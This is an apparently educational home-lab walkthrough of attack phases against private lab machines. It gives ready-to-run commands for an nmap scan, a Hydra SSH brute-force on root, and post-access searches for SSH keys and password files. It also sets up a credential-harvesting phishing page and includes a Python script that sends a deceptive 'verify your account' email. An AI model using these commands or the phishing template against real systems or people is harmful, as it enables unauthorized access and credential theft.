# Cyber Attack - Initial Access to Breached
---
## Setup Attacker machine
- Name our machine ``` project-x-attacker ```.
- Set IP address to ``` 10.0.0.5 ```.

## The Concept of Reconnaissance
- Also referred to as 'recon'. This is first phase of a cyber-attack where attackers gather information about their target to identify vulnerabilities they can exploit. This phase is all about preparation and involves collecting as much data as possible about the target's systems, network, employees, or infrastructure without triggering alarms.

## Scanning
- Nmap (Network Mapper) is a powerful open-source tool for network discovery and security auditing. It finds hosts, open ports, running services and versions, OS guesses, and can run scripts to automate checks.
- To discover which services are running and identify their versions on the target, we can execute nmap -sV -p1-1000 10.0.0.8, which will probe TCP ports 1 through 1000 on 10.0.0.8 and perform service/version detection

## Brute-force attack
- Hydra: Password-cracking tool used for brute-force attacks on various network services. It automates the process of attempting multiple username and password combinations to gain unauthorized access to systems. We can initiate a brute force and use a wordlists file, such as rockyou.txt to see if there are any matches.
``` hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.8 ```
- If success, we'll have the ```root``` password so that we can connect to this machine through ssh.
## Initial Access
Attackers establish a foothold in the target’s environment. This is the entry point, achieved by exploiting vulnerabilities, phishing, using compromised credentials, or exploiting misconfigurations. The goal is to gain access to the target network while avoiding detection, setting the stage for further malicious activities.
- Some command to investigate the system when we've owned it by brute-force:
```
cat /etc/os-release
hostname
ip a
netstat -tuln (Inspect network services)
ps aux, top
ls -la /home (check user home directories)
ls -la /etc (check configuration files)
ls -la ~/.ssh/ (view SSH keys and known hosts)
find / -name “password” 2>/dev/null (search for any files containing the password string)
```

## Phishing
- Using deceptive methods like fake emails, texts, or websites that appear legitimate but are designed to steal information for financial fraud
or identity theft. We are going to simulate it
Navigate to the /var/www/html folder, this is where default websites can be provisioned
- Download the project files: ```git clone https://github.com/collinsmc23/projectsecurity-e101```, which gain credentials from a form if we perform a login function.
- Make a new logging file to log the captured credentials, set permissions on this file:
```
sudo touch /var/www/html/creds.log
sudo chmod 666 /var/www/html/creds.log
```

- Start the apache2 webservice: ``` sudo service apache2 start ```
- We can craft a small Python script that simulates a phishing email using smtplib and email.message in order to demonstrate how attackers craft deceptive messages and to evaluate user awareness and defensive control
```
import smtplib
from email.message import EmailMessage

msg = EmailMessage()
msg["Subject"] = "Update Password!"
msg["From"] = "project-x-hrteam@corp.project-x-dc.com"
msg["To"] = "janed@linux-client"

# Plain text version (fallback)
msg.set_content("Hey Jane! This is HR, make sure to update your password info.")

# HTML version
html_content = """
<html>
  <body>
    <p>Hey Jane!<br>
We noticed an unusual login attempt on your account, and for your security, we have temporarily locked access. To restore access, please verify your account credentials within the next 24 hours. Failure to do so may result in permanent restrictions on your account.
To verify your credentials, please click the link below:</p>
<a href='http://10.0.0.50'>Verify My Account</a>
<p>For assistance, please contact our support team at support@company.com.
Thank you for your prompt attention to this matter.
Best regards,
ProjectX Security Team
    </p>
  </body>
</html>
"""

msg.add_alternative(html_content, subtype='html')

# Send the email
with smtplib.SMTP("localhost", 1025) as server:
    server.send_message(msg)
```

- Run it and go to [project-x-linux-client], we'll see this email.
<img width="815" height="623" alt="image" src="https://github.com/user-attachments/assets/4e64d901-7c63-46d3-8ec7-79b1dc49cf5b" />

- If we open the link and verify the username and password, the attacker can see them.
  <img width="451" height="337" alt="image" src="https://github.com/user-attachments/assets/58f565a7-1951-49cf-87a8-d2145f195697" />
- That's how we can leverage phishing email to gain usernames and credentials.
<img width="529" height="89" alt="image" src="https://github.com/user-attachments/assets/f1e36604-7542-495a-ba81-25f82d4c0b5d" />

<img width="580" height="279" alt="image" src="https://github.com/user-attachments/assets/69894ebe-b0f9-431c-96a1-02c5074d48fb" />



